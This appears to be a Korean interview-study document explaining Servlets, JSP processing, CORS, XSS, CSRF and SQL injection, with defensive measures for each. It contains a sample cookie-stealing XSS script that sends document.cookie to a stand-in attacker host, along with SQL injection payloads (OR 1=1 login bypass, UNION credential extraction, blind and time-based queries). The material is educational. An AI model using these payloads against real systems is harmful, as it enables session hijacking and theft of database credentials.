## Servlet이란 어떤 것인지

<details>
<summary>생각해보고 답 확인</summary>

<p align="center">
<img src="https://github.com/dnzp75/Java/assets/105201451/de3307b6-2fa2-411d-93e8-eaa763f1b98e" width="550" height="300"/>

 - 동적 웹 페이지를 만들 때 사용되는 자바 기반의 웹 애플리케이션 프로그래밍 기술이다. 
 
 - 서블릿은 웹 요청과 응답의 흐름을 간단한 메서드 호출만으로 체계적으로 다룰 수 있게 해준다.

   ※ 서블릿은 서버에서 실행되다가 웹 브라우저에서 요청을 하면 해당 기능을 수행한 후 웹 브라우저에 결과를 전송한다.

▶ 서블릿(Servlet)의 주요 특징
- 클라이언트의 Request에 대해 동적으로 작동하는 웹 어플리케이션 컴포넌트
- 기존의 정적 웹 프로그램의 문제점을 보완하여 동적인 여러 가지 기능을 제공
- JAVA의 스레드를 이용하여 동작
- MVC패턴에서 컨트롤러로 이용됨
- 컨테이너에서 실행
- 보안 기능을 적용하기 쉬움


### 2. 서블릿의 동작과정

<p align="center">
<img src="https://github.com/dnzp75/Java/assets/105201451/99135836-2f0e-4c04-b1a7-5eaf65f6b423" width="550" height="300"/>

클라이언트가 웹 서버에 요청하면 / 웹 서버는 그 요청을 톰캣과 같은 [WAS]에 위임한다. / 그러면 WAS는 각 요청에 해당하는 서블릿을 실행한다. / 그리고 서블릿은 요청에 대한 기능을 수행한 후 결과를 반환하여 클라이언트에 전송한다.

```
1. 클라이언트 요청
2. HttpServletRequest, HttpServletResponse 객체 생성
3. Web.xml이 어느 서블릿에 대해 요청한 것인지 탐색
4. 해당하는 서블릿에서 service() 메소드 호출
5. doGet() 또는 doPost() 호출
6. 동적 페이지 생성 후 ServletResponse 객체에 응답 전송
7. HttpServletRequest, HttpServletResponse 객체 소멸
```

※ web.xml : 서블릿을 작성했다면 / 해당 서블릿을 사용자가 요청한 경로와 맵핑시켜야 / WAS에서 맵핑된 정보를 읽어서 브라우저에서 해당 URL로 HTTP요청 시 / 해당 서블릿으로 요청을 전달해 줄 수 있다. 소스를 분석할 때도 가장 먼저 확인해봐야 할 부분이다. 톰캣을 예로 들면 웹 어플리케이션 서비스 처리에 대해 정의된 환경 설정 파일이 server디렉터리의 web.xml에 있다.

### ▶ 서블릿 형식

```java
public class FirstServlet extends HttpServlet {
	@Override
    public void init() {
    ...
	}

    @Override
    public void doGet(HttpServletRequest req, HttpServletResponse resp) {
    ...
    }

    @Override
    public void destroy() {
    ...
    }
}
```

### 3. 서블릿 생명주기

서블릿도 자바 클래스이므로 실행하면 [ 초기화부터 서비스 수행 후 소멸하기까지의 과정을 거친다.] 

이 과정을 서블릿의 생명주기라하며 각 단계마다 **호출되어 기능을 수행하는 콜백 메서드**를 서블릿 생명주기 메서드라한다.

1. 클라이언트의 요청이 들어오면  / 컨테이너는 해당 서블릿이 메모리에 있는지 확인하고, 없을 경우 init()메서드를 호출하여 메모리에 적재한다. init()은 처음 한번만 실행되기 때문에, 서블릿의 스레드에서 공통적으로 사용해야 하는 것이 있다면 오버라이딩 하여 구현하면 된다. 실행 중 서블릿이 변경될 경우, 기존 서블릿을 destroy()하고 init()을 통해 새로운 내용을 다시 메모리에 적재한다.

2. init()이 호출된 후 클라이언트의 요청에 따라서 service() 메소드를 통해 요청에 대한 응답이 doGet()과 doPost()로 분기된다. 이 때 서블릿 컨테이너가 클라이언트의 요청이 오면 가장 먼저 처리하는 과정으로 생성된 HttpServletRequest, HttpServleResponse에 의해 request와 response 객체가 제공된다.

3. 컨테이너가 서블릿에 종료 요청을 하면 destroy() 메소드가 호출되는데 마찬가지로 한번만 실행되며, 종료시에 처리해야 하는 작업들은 destroy() 메소드를 오버라이딩하여 구현하면 된다.

### ▶ 서블릿 생명주기 < 메서드 >

**초기화 : init()**

- 서블릿 요청 시 맨 처음 한 번만 호출된다.
- 서블릿 생성 시 초기화 작업을 주로 수행한다.

**작업 수행 : doGet(), doPost()**

- 서블릿 요청 시 매번 호출된다.
- 실제로 클라이언트가 요청하는 작업을 수행한다.

**종료 : destroy()**

- 서블릿이 기능을 수행하고 메모리에서 소멸될 때 호출된다.
- 서블릿의 마무리 작업을 주로 수행한다.

### 4. 서블릿 컨테이너

- 서블릿 컨테이너란, 구현되어 있는 servlet 클래스의 규칙에 맞게 서블릿을 담고 관리해주는 컨테이너다.

- 클라이언트에서 요청을 하면 컨테이너는 HttpServletRequest, HttpServletResponse 두 객체를 생성하여 post, get여부에 따라 동적인 페이지를 생성하여 응답을 보낸다.

</details>

### Servlet에서 리퀘스트(요청)를 받으면 서블릿에 있는 어떤 메서드들이 호출되는지 설명하라 

### Servlet의 생명주기에 대해 설명하라 

### Servlet이 호출될 때 처리 과정이 어떻게 되는가? 

### JSP 동작 과정에서 Servlet이 어떻게 사용되는지 설명하라. 

### JSP 처리 과정

<details>
<summary>생각해보고 답 확인</summary>

웹 브라우저에 JSP 페이지에 해당하는 URL을 입력하면, 톰캣 서버는 다음과 같은 과정을 거쳐 JSP 페이지를 실행한다.

<p align="center">
<img src="https://github.com/dnzp75/Java/assets/105201451/6cfb71bc-5c98-4d58-a7e7-cef9c28af427" width="550" height="300"/>


WAS는 JSP 페이지에 대한 요청이 들어오면 다음과 같은 처리를 한다.

JSP에 해당하는 서블릿이 존재하지 않을 경우(과정 1.1)

- JSP 페이지로부터 자바 코드를 생성한다. (과정 1.2)
- 자바 코드를 컴파일해서 서블릿 클래스를 생성한다. (과정 1.3)
- 서블릿에 클라이언트 요청을 전달한다. (과정 2.1)
- 서블릿이 요청을 처리한 결과를 응답으로 생성한다. (과정 2.2)
- 응답을 웹 브라우저에 전송한다. (과정 3)

JSP에 해당하는 서블릿이 존재하는 경우(즉, 이미 과정 1.1~1.3을 거친 경우)

- 서블릿에 클라이언트 요청을 전달한다. (과정 2.1)
- 서블릿이 요청을 처리한 결과를 응답으로 생성한다. (과정 2.2)
- 응답을 웹 브라우저에 전송한다. (과정 3)

즉, JSP 페이지를 요청할 때에는 JSP를 직접 실행하는 것이 아니라, JSP를 자바 소스 코드로 변환한 뒤 컴파일해서 생성한 서블릿을 생성하는 것이다. 여기서 JSP 페이지를 자바 코드로 변경하는 단계를 "변환(translation)단계"(과정 1.2)라고 하며, 자바 코드를 서블릿 클래스로 변경하는 단계를 "컴파일(compile)단계"(과정 1.3)라고 한다.

톰캣은 work 폴더에 JSP를 변환한 자바 소스 코드와 서블릿 클래스를 생성한다. 예를 들어, 앞서 3장에서 실행했던 JSP의 자바 소스 코드와 서블릿 클래스는 다음 폴더에서 찾을 수 있다.

```
C:\apache-tomcat-8.0.2\work\Catalina\localhost\chap03\org\apache\jsp
```

위 폴더를 보면 JSP 파일을 자바 코드로 변환한 소스 코드와 컴파일된 클래스 파일을 발견할 수 있다.

JSP 페이지를 변경하면 JSP 페이지는 기존에 이미 서블릿이 생성되었는지에 상관없이 위의 과정을 거쳐 JSP 페이지로부터 서블릿 클래스를 다시 생성한다.

> JSP를 실행한다는 말은 곧 JSP 페이지를 컴파일한 결과인 서블릿 클래스를 실행한다는 의미가 된다.
>

</details>





## CORS란 무엇인지?

<details>
<summary>생각해보고 답 확인</summary>

- 브라우저 환경에서만 적용되며 한 출처가 다른 출처에 요청을 할 수 있도록 하는 보안 메커니즘

- 모든 브라우저는 단일 출처 정책(Single Origin Policy)을 따른다

- 즉, 기본적으로 다른 출처에 요청할 수 없지만 서버가 적절하게 구성된 CORS 헤더를 제공하는 경우 선택적으로 교차 출처 정책을 사용할 수 있습니다.

 ### 브라우저에서만 적용된다는 말은 무슨 말인가?
 
- 브라우저에서 다른 서버에서 요청할 경우에 해당되고, 브라우저를 거치지 않고 **서버 간 통신**을 할 때는 이 정책이 적용되지 않는다.

### 단일 출처 정책(Single Origin Policy)이 무엇인가?

- **origin(출처)** 이란 scheme(protocol), host(domain), port 로 구성

- 예를들어, https://www.google.com/maps 라는 주소가 있다고하면 [ protocol은 https:// ] [ Host는 www.google.com ] [ Port는 :443 ]

- 동일 출처(Same Origin) 란 scheme, host, port 가 모두 같을때를 말한다.

- SOP(Same-Origin Policy) 이란 같은 출처에서만 리소스를 공유할 수 있다는 규칙

### 다른 origin에 있는 리소스를 허용하지 않는 이유는 무엇인가?

- ( = 이런 정책이 왜 존재할까?) 만약 다른 출처의 어플리케이션이 서로 통신하는 것에 대해 아무런 제약도 존재하지 않는다면 악의를 가진 사용자가 소스 코드를 보고 CSRF(Cross-Site Request Forgery)나 XSS(Cross-Site Scripting)와 같은 방법을 사용하여 정보를 탈취할 수 있다.

- CORS는 다른 출처의 리소스가 필요한 경우, SOP를 우회하기 위한 여러가지 방법 중 가장 권장되는 방법이다.

### **5. 브라우저의 CORS 동작원리**

1. 브라우저는 요청 헤더에 Origin이라는 필드에 본인 출처를 넣어서 보낸다.`(cookie를 사용하는 보안과 관련된 것은 credentials 헤더를 true로 보내줘야 한다.)`
2. 서버는 응답 헤더에 Access-Control-Allow-Origin에 본인이 허용하는 출처를 담아서 응답하게 된다.`(cookie와 같은 보안과 관련된 것은 Access-Control-Allow-Credentials를 true로 응답해야 한다.)`
3. 브라우저는 Origin과 Access-Control-Allow-Origin을 비교하고, 맞는지 틀린지 검사만 한다.
4. 맞으면 그대로 응답을 사용하고, 틀리다면 에러를 뱉고 응답을 버린다.

### **6. Simple Request**

위에서 설명한 CORS의 동작 원리는 GET, POST와 같은 일정 조건의 요청들에 사용된다.

이것을 simple request라고 한다. 

### **6.1. Preflight 요청**

하지만 delete, put고 같은 것들은 기존 데이터에 영향을 주는 것이기 때문에

request 전에 Preflight 요청이란걸 먼저 보내서 본 요청이 안전한지 확인하고, 이상이 없다면 요청을 보낼 수 있다.

아무래도 PUT, DELETE와 같이 서버의 데이터에 영향을 주는 행위는 위험하기 때문에

사전 요청을 하는 것인데 서버에게 해당 request origin에 DELETE를 허용할 것인지 묻는 것이다.

GET같은 경우는 데이터에 영향이 없기 때문에 응답을 버리기만 하면 되는데 DELETE를 데이터를 변경해버리기 때문이다.

https://chanto11.tistory.com/67

https://ingg.dev/cors/

</details>




------
## XSS란 무엇인지?

<details>
<summary>생각해보고 답 확인</summary>


- 공격자가 클라이언트 측 스크립트를 웹 페이지에 삽입하는 공격

- 가장 대표적인 사례가 게시글이다. 게시글에 글을 입력할 때, 스크립트 파일을 포함하여, 해당 게시글을 클릭한 사용자의 브라우저에서 해당 스크립트가 실행되도록 하는것이다.

- XSS 를 사용하여 동일 출처 정책 및 CSRF 보호를 모두 우회 할 수 있습니다.

- XSS를 방지하기 위해서는 반드시 Script 문자 필터링이 필요하다.

- XSS 는 출력부분에서 가장 잘 처리할 수 있습니다.

[ 입력 -> 데이터베이스 -> **출력(이스케이프 처리)** ]

### esacpe를 처리한다 라는 말을 들어보았는가? 이게 어떤걸 말하는가?

특정 문자를 원래의 기능에서 벗어나게 변환하는 행위를 **이스케이프(Escape)** 라고 한다.

HTML은 '<'을 태그의 시작으로 인식하기 때문에 

HTML에서 제대로 렌더링되지 않는 상황들을 고려해 원래의 기능에서 벗어난 문자열로 변환하여 의도대로 구문 분석을 하도록 이스케이프 사용


**그런데 이스케이프가 어떻게 XSS 공격을 방지할 수 있을까?** 

크로스 사이트 스크립팅 공격은 블로그나 게시판 같은 서비스에서 주로 일어나며 여러 사람들이 보는 글에 **스크립트**를 주입해서 사용자의 정보(쿠키, 세션)를 탈취하거나 비정상적인 기능을 수행하게 한다.

예를 들어 글을 쓸 때

1. 제목과 글을 입력해서 글쓰기를 클릭하면
2. 웹 서버에선 해당 데이터를 받아서 DB에 저장한다.
3. 다른 사용자가 해당 서버에 접속해 DB에 있는 해당 글을 읽게 되면
4. 그 때 써놓은 내용을 볼 수 있다.

이런 과정에서 글 대신 **스크립트 언어**를 써서 다른 사용자가 해당 글을 읽을 때 **스크립트 언어가 실행**되어 피해를 입게 하는 것이 XSS 공격이다.

스크립트 코드가 실행 되면 피해자의 쿠키값을 해커의 서버 주소인 http://hackerServer.com에 그대로 전부 보내게 되고 해당 정보를 이용해 악용할 수 있는 것이다. 

렌더링이 되기 전(사용자에게 보이기 전)  / 이스케이프된 모든 값은 브라우저에선 아래와 같이 입력한 그대로 보이게 되지만 

HTML 본연의 태그나 스크립트 기능이 제거가 되기 때문에 XSS(Cross Site Scripting) 공격을 방지할 수 있다.

```
<!-- 이스케이프 후 브라우저에서 보이는 화면-->
<script>
  let xmlHttp = new XMLHttpRequest();
  const url =
    'http://hackerServer.com?victimCookie=' +
    document.cookie;
  xmlHttp.open('GET', url);
  xmlHttp.send();
</script>
```

https://wikidocs.net/127508

https://onlydev.tistory.com/78

### **■ 공격 유형에 따른 분류**

공격자가 삽입한 악성스크립트가 사용자 측에서 어떻게 동작하는지에 따라 크게 세 가지로 분류할 수 있으며 각각의 개념과 동작 과정은 다음과 같다.


### **Stored XSS (저장형 크로스사이트 스크립팅)**

- 공격자의 악성스크립트가 데이터베이스에 저장되고 이 값을 출력하는 페이지에서 피해가 발생하는 취약점이다.

- 공격자는 악성스크립트가 포함된 게시물을 작성하여 게시판 등 사용자가 접근할 수 있는 페이지에 업로드한다. 

- 이때 사용자가 악성스크립트가 포함된 게시물을 요청하면, 공격자가 삽입한 악성스크립트가 사용자 측에서 동작하게 된다.

- 공격자의 악성스크립트가 서버에 저장되어 불특정 다수를 대상으로 공격에 이용될 수 있어 Reflected XSS보다 공격 대상의 범위가 훨씬 크다.

<p align="center">
<img src="https://github.com/dnzp75/Java/assets/105201451/68792e47-656d-47ff-b529-9e0f6f6b4777" width="500" height="300"/>
  
[Stored XSS]

<p align="center">
<img src="https://github.com/dnzp75/Java/assets/105201451/46b79afb-568a-4364-926d-5479bb3ff3da" width="400" height="300"/>

Stored XSS 공격 과정은 다음을 통해 확인할 수 있다.

[Stored XSS 공격 과정]


### **Reflected XSS (반사형 크로스사이트 스크립팅)**

- 사용자가 요청한 악성스크립트가 사용자 측에서 반사(Reflected)되어 동작하는 취약점으로, 

- 공격자의 악성스크립트가 데이터베이스와 같은 저장소에 별도로 저장되지 않고 사용자의 화면에 즉시 출력되면서 피해가 발생한다.

- 공격자는 악성스크립트가 포함된 URL을 이메일, 메신저 등을 통해 사용자가 클릭할 수 있도록 유도한다. 

- 사용자가 악성스크립트가 삽입된 URL을 클릭하거나 공격자에 의해 악의적으로 조작된 게시물을 클릭했을 때 사용자의 브라우저에서 악성스크립트가 실행된다.

<p align="center">
<img src="https://github.com/dnzp75/Java/assets/105201451/7fd0cd4a-127f-4e92-b672-735dd669aaf4" width="500" height="300"/>


[Reflected XSS]

Reflected XSS 공격 과정은 다음을 통해 확인할 수 있다.

<p align="center">
<img src="https://github.com/dnzp75/Java/assets/105201451/fada8137-1912-4d96-8d54-44b8f244752b" width="400" height="300"/>

[Reflected XSS 공격 과정]


### **DOM Based XSS (DOM 기반 크로스사이트 스크립팅)**

- 공격자의 악성스크립트가 DOM 영역에서 실행됨으로써 서버와의 상호작용 없이 브라우저 자체에서 악성스크립트가 실행되는 취약점이다. 

- DOM 영역에 변화가 생기면 브라우저는 서버로 패킷을 보내지 않고 DOM 영역에서 페이지를 변환시킨다.

- 따라서 DOM의 일부로 실행되기 때문에 브라우저 자체에서 악성스크립트가 실행된다.

- DOM(Document Object Model, 문서 객체 모델) 이란?

브라우저가 웹 페이지를 렌더링 하는데 사용하는 모델로 HTML 및 XML 문서에 접근하기 위한 인터페이스이다. 브라우저는 HTML 문서를 읽고 해석한 결과를 DOM 형태로 재구성하여 사용자에게 제공한다.

</details>


------
## CSRF란 무엇인지?

<details>
<summary>생각해보고 답 확인</summary>

- 사용자가 자신의 의지와 무관하게 공격자가 의도한 행동을 해서 특정 웹 페이지를 보안에 취약하게 하거나 수정, 삭제 등의 작업을 하게 만드는 공격 방법.

- 공격 난이도가 높지 않아 흔히 사용된다.

- XSS을 이용한 공격이 사용자가 특정 웹사이트를 신용하는 점을 노린 것이라면,

- CSRF는 특정 웹사이트가 사용자의 웹 브라우저를 신용하는 상태를 노린 것이다.

https://devscb.tistory.com/123

### **1.2. CSRF 전제 조건과 공격 과정**

CSRF 공격을 위한 조건과 과정에 대해 알아보겠습니다. CSRF 공격을 시도하기 위해선 아래와 같은 몇 가지 조건이 필요합니다.

- 사용자가 보안이 취약한 서버로부터 이미 인증을 받은 상태여야 합니다.
- 쿠키 기반으로 서버 세션 정보를 획득할 수 있어야 합니다.
- 공격자는 서버를 공격하기 위한 요청 방법에 대해 미리 파악하고 있어야 합니다. 예상치 못한 파라미터가 있으면 불가능합니다.

위와 같은 조건이 만족되면 다음과 같은 과정을 통해 CSRF 공격이 수행됩니다.

1. 사용자는 보안이 취약한 서버에 로그인합니다.
2. 로그인 이후 서버에 저장된 세션 정보를 사용할 수 있는 `sessionID`가 사용자 브라우저 쿠키에 저장됩니다.
3. 공격자는 서버에 인증된 브라우저의 사용자가 악성 스크립트 페이지를 누르도록 유도합니다.
    - 해당 악성 스크립트가 담긴 페이지를 클릭하도록 유도하는 방법은 다양한 것 같으나 몇 가지 유형을 정리하자면 다음과 같습니다.
    - 게시판에 악성 스크립트를 게시글로 작성하여 관리자 혹은 다른 사용자들이 게시글을 클릭하도록 유도합니다.
    - 메일 등으로 악성 스크립트를 직접 전달하거나, 악성 스크립트가 적힌 페이지 링크를 전달합니다.
4. 사용자가 악성 스크립트가 작성된 페이지 접근시 쿠키에 저장된 `sessionID`는 브라우저에 의해 자동적으로 함께 서버로 요청됩니다.
5. 서버는 쿠키에 담긴 `sessionID`를 통해 해당 요청이 인증된 사용자로부터 온 것으로 판단하고 처리합니다.

<p align="center">
<img src="https://github.com/dnzp75/Java/assets/105201451/393c5291-195d-41f9-8052-708a74b4f92b" width="500" height="300"/>

### CSRF를 방어하는 방법이 무엇이 있는지 설명하라

**Referrer 검증**

서버에서 사용자의 요청에 `Referrer` 정보를 확인하는 방법이 있습니다. 요청 헤더(request header) 정보에서 `Referrer` 정보를 확인할 수 있습니다. 보통이라면 호스트(host)와 `Referrer` 값이 일치하므로 둘을 비교합니다. CSRF 공격의 대부분 `Referrer` 값에 대한 검증만으로 방어가 가능하다고 합니다.

 **CSRF 토큰 검증**

임의의 CSRF 토큰을 만들어 세션에 저장합니다. 요청하는 페이지에 `hidden` 타입 input 태그를 이용해 토큰 값을 함께 전달합니다. 이후 서버에서 세션에 저장된 CSRF 토큰 값과 요청 파라미터에 담긴 토큰 값을 비교합니다

 **CAPTCHA 사용**

이미지를 보여주고 그 이미지에 해당하는 문자/숫자/그림이 아니라면 요청을 거부하는 방법이다.


</details>




------
## SQL Injection이란 무엇인지?

<details>
<summary>생각해보고 답 확인</summary>

# SQL Injection(SQL 인젝션, SQL 삽입)이란 ?

악의적인 사용자가 응용 프로그램 보안 상의 **허점**을 의도적으로 이용해, 

악의적인 SQL문을 주입하고 실행되게 하여 데이터베이스가 비정상적인 동작을 하도록 조작하는 행위입니다.

주로 사용자가 입력한 데이터를 제대로 **필터링**, **이스케이핑**하지 못했을 경우에 발생합니다. 

이러한 injection 계열의 취약점들은 테스트를 통해 발견하기는 힘들지만 **스캐닝툴**이나 **코드 검증절차**를 거치면 보통 쉽게 발견되기 때문에 탐지하기는 쉬운 편입니다.

인젝션 공격은 OWASP에서도 1순위로 분류되었던 만큼 공격이 성공할 경우 큰 피해를 입힐 수 있어 보안에 각별한 주의가 필요합니다.

# 공격 종류 및 방법

## 1 ) Error based SQL Injection (가장 대중적인 기법)

 SQL 쿼리에 **고의적으로 오류를 발생**시키고 / 이때 출력되는 에러의 내용으로 **필요한 정보를 찾아내는 공격 기법**

기본적으로 '(싱글 쿼테이션) 또는 "(더블 쿼테이션)을 이용하여 GET, POST 요청 필드나 HTTP 헤더 값, 쿠키값 등에 삽입하여 **SQL 에러를 통해 정보를 예상**하게 됩니다. GROUP BY나 HAVING 등을 이용하기도 합니다.

### 로그인 공격 예시

로그인 페이지가 있고, 로그인을 할 때 USER_ID와 INPUT_PW를 입력받아 로그인이 진행된다고 했을 때

- 기본 쿼리문

```sql
SELECT user FROM Users WHERE uid = 'USRE_ID' AND upw = 'INPUT_PW';
```

- 공격 예시 : 로그인 창의 ID 부분에 'OR 1 = 1 --를 입력합니다.

```sql
SELECT user FROM Users WHERE uid = '' OR 1 = 1 --USRE_ID' AND upw = 'INPUT_PW';
```

- WHERE절에 있는 싱글 쿼터를 닫아주게 되고,
- OR 1 = 1로 모두 참을 만들어 준 후
- -를 이용해 그 뒤의 모든 쿼리문을 주석처리해주게 됩니다.

결과적으로 Users 테이블에 있는 모든 정보를 조회하게 되며 가장 먼저 만들어진 계정(보통 관리자 계정)으로 로그인할 수 있게 되어 관리자 계정을 탈취하게 됩니다.

## 2 ) Union base SQL Injection

UNION 키워드를 사용하여 원래의 요청에 추가 정보를 얻는 공격 기법으로 UNION 하려는 두 테이블의 컬럼 수와 데이터 형식이 같아야 합니다. 

ORDER BY 절이나 HAVING을 이용한 오류 메시지를 통해 컬럼의 수를 유추할 수 있습니다.

### 게시글 조회 공격 예시

게시판이 있고, 게시글을 검색할 때 INPUT을 받아 검색이 진행된다고 했을 때

- 기본 쿼리문

```sql
SELECT * FROM Board WHERE title LIKE '%INPUT%' OR contents '%INPUT%'
```

- 공격 예시 : 검색 창에 'UNION SELECT null, id, passwd FROM User를 -- 입력합니다.

```sql
SELECT * FROM Board WHERE title LIKE '%' UNION SELECT null, id, passwd FROM Users --%' OR contents '%INPUT%'
```

사전 공격을 통해 컬럼명과 테이블명을 얻은 후 사용자의 ID와 PW를 요청하는 쿼리문을 함께 입력하게 되면 사용자의 개인 정보가 게시글과 함께 보이게 됩니다.

## 3) Blind SQL Injection

에러가 발생되지 않는 사이트에서 데이터 베이스로부터 특정한 값이나 데이터를 전달받지 않고, 단순히 **참과 거짓의 정보만 알 수 있을 때 사용하는 공격 기법**입니다.

 limit, SUBSTR, ASCII를 사용해서 조건이 참이면 페이지가 정상적으로 출력되고 그렇지 않을 경우 출력되지 않음으로 구분이 가능합니다.

최근에는 에러 메시지를 출력하지 않는 웹 서버를 구축하고 있어 주로 사용하는 방식입니다.

### Boolean 기반 공격 예시

- 기본 쿼리문

```sql
SELECT user FROM Users WHERE uid = 'USRE_ID' AND upw = 'INPUT_PW';
```

- 공격 예시 : 로그인 폼에 DB 테이블 명을 알아내기 위한 쿼리문을 주입, 이때 임의로 가입한 idd3이라는 아이디와 함께 구문을 주입합니다.

```sql
SELECT * FROM Users WHERE uid = 'idd3' and ASCII(SUBSTR((SELECT name FROM information_schema.tables WHERE table_type='base table' limit 0,1),1,1)) > 100 -- USRE_ID' AND upw = 'INPUT_PW';
```

- limit키워드를 통해 하나의 테이블만 조회하고, SUBSTR함수로 첫 글자만 찾게 됩니다.
- ASCII를 통해 값이 변환되고 조회되는 테이블 명의 첫 번째 글자가 U면 테이블이 조회됩니다.
- 참(로그인)이 될 때까지 100 숫자를 변경하며 비교를 하게 됩니다.
- 자동화 스크립트로 만들어 단기간 내에 테이블 명을 알아낼 수도 있습니다.

### Time 기반 공격 예시

- 기본 쿼리문

```sql
SELECT user FROM Users WHERE uid = 'USRE_ID' AND upw = 'INPUT_PW';
```

- 공격 예시

```sql
SELECT user FROM Users WHERE uid = 'idd3' OR (LENGTH(DATABASE())=1 AND SLEEP(2)) -- USRE_ID' AND upw = 'INPUT_PW';
```

- 숫자 1을 조작해 현재 사용하고 있는 데이터 베이스의 길이를 알아낼 수 있습니다.
- LENGTH를 사용해 문자열 길이를 반환하도록 합니다.
- DATABASE()를 사용해 데이터베이스의 이름을 반환합니다.

SLEEP단어가 치환 처리되었을 경우, BENCHMARK나 WAIT함수를 사용할 수 있습니다.

## 4 ) Stored Procedure based SQL Injection

저장 프로시저(Stored Procedure)는 쿼리들을 모아 하나의 함수처럼 사용하기 위한 것입니다.

웹에서 저장 프로시저에 대한 접근 권한을 가짐으로써 실행이 가능해집니다. 

공격 난도가 높으나 성공 시 직접적인 피해를 입힐 수 있는 공격 기법입니다.

## 5) Mass SQL Injection

한 번의 공격으로 다량의 DB가 조작해 큰 피해를 입히는 공격 기법입니다.

# 대응 방안

### 1 ) 입력값 검증

사용자의 입력을 받을 때 검증 로직을 추가하여 값이 유효한지 검증합니다.

- ', ", #, --, = 등 특수문자와 명령어 필터링
- 데이터 길이 제한

### 2 ) 저장 프로시저 사용

동적 SQL 쿼리를 생성하지 않는 것이 SQL 인젝션을 막기 위한 가장 효과적인 방법일 것입니다. 저장 프로시저를 사용하여 지정된 형식의 데이터가 아니면 쿼리가 실행되지 않도록 합니다.

### 3 ) 서버 보안

- 데이터 베이스 권한 제한합니다.
- 신뢰 가능한 네트워크와 서버에 대해서만 접근을 허용합니다.
- SQL 서버 오류 발생 시, 해당하는 에러 메시지를 볼 수 없도록 합니다.

</details>
